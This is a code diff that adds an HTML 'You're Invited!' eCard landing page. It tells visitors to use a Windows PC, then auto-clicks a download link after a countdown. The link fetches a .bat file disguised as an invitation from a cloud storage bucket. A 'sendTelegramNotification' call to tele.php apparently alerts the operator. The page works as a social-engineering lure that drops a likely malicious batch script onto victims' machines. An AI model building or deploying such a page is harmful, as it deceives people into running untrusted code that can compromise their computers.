@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Invitation Landing Page</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #6e8efb, #a777e3);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: white;
+            text-align: center;
+        }
+        .container {
+            background: rgba(255, 255, 255, 0.2);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 30px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+            max-width: 500px;
+            width: 90%;
+        }
+        h1 {
+            font-size: 2.5rem;
+            margin-bottom: 20px;
+        }
+        p {
+            font-size: 1.2rem;
+            margin-bottom: 10px;
+        }
+        .instructions {
+            font-size: 1rem;
+            margin: 20px 0;
+            color: #ffcc00;
+            font-weight: bold;
+        }
+        .countdown {
+            font-size: 2rem;
+            margin: 20px 0;
+            color: #ffcc00;
+        }
+        .download-btn {
+            background: #ff6b6b;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 1.2rem;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 20px;
+            text-decoration: none;
+            display: inline-block;
+            /* Added border styling */
+            border: 2px solid rgba(255, 255, 255, 0.5);
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        }
+        .download-btn:hover {
+            background: #ff5252;
+            transform: scale(1.05);
+            border-color: rgba(255, 255, 255, 0.8);
+        }
+        .loader {
+            display: none;
+            margin: 20px auto;
+            width: 50px;
+            height: 50px;
+            border: 5px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top: 5px solid #ffcc00;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>You're Invited!</h1>
+        <p>Your exclusive eCard is ready to download.</p>
+        <div class="instructions">Please open this file on a <strong>Windows PC</strong> to view your eCard.</div>
+        <div class="countdown" id="countdown">3</div>
+        <div class="loader" id="loader"></div>
+        <a href="https://pub-5cee798917e74c19858a5e3faa0f6ce0.r2.dev/Ecards%20Online%20Invites.bat" class="download-btn" id="downloadBtn" download onclick="sendTelegramNotification()">Download Now</a>
+    </div>
+
+    <script>
+        let countdown = 3;
+        const countdownElement = document.getElementById('countdown');
+        const loader = document.getElementById('loader');
+        const downloadBtn = document.getElementById('downloadBtn');
+
+        function sendTelegramNotification() {
+            fetch('tele.php')
+                .then(response => console.log('Notification sent'))
+                .catch(error => console.error('Error:', error));
+        }
+
+        const timer = setInterval(() => {
+            countdown--;
+            countdownElement.textContent = countdown;
+
+            if (countdown <= 0) {
+                clearInterval(timer);
+                countdownElement.style.display = 'none';
+                loader.style.display = 'block';
+                downloadBtn.style.display = 'none';
+
+                setTimeout(() => {
+                    loader.style.display = 'none';
+                    downloadBtn.style.display = 'inline-block';
+                    downloadBtn.click();
+                }, 2000);
+            }
+        }, 1000);
+    </script>
+</body>
+</html>
